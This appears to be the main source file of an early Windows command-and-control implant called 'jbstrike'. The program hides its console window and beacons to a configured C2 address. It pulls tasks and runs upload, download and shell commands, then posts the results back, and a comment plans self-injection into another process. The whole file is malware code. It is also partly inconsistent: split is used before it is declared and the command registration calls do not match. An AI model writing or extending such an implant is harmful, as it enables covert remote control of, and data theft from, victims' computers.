// jbstrike_0.1a.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <Windows.h>
#include <WinHttp.h>

#include "Config.h"
#include "Agent.h"
#include "Command.h"
#include "Shell.h"

#pragma comment(lib, "winhttp.lib")

int main()
{
	// Hide console window
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	Agent agent(C2_IP, C2_PORT);
	Command cmdHandler;
	Shell shell;

	// add inject self into smth else/
	//Agent::Register();

	cmdHandler.RegisterCommand(UPLOAD_CMD, shell);
	cmdHandler.RegisterCommand(DOWNLOAD_CMD, "download");
	cmdHandler.RegisterCommand(SHELL_CMD, "shell");

	while (true) {
		std::string task = agent.Get(TASK_URI);

		if (task != "") {
			std::vector <std::string> Task = split(task);
			std::string Command = Task[0];

			if (cmdHandler.HasCommand(Command)) {
				std::string result;
				
				result = cmdHandler.ExecuteCommand(Command);

				agent.Post(result);
			}		
		}

		Sleep(SLEEP_TIME);
	}
}


std::vector <std::string> split(std::string cmd, char delimiter = ' ') {
	std::string line;
	std::vector <std::string> vec;
	std::stringstream ss(cmd);

	while (std::getline(ss, line, delimiter)) {
		vec.push_back(line);
	}
	return vec;
}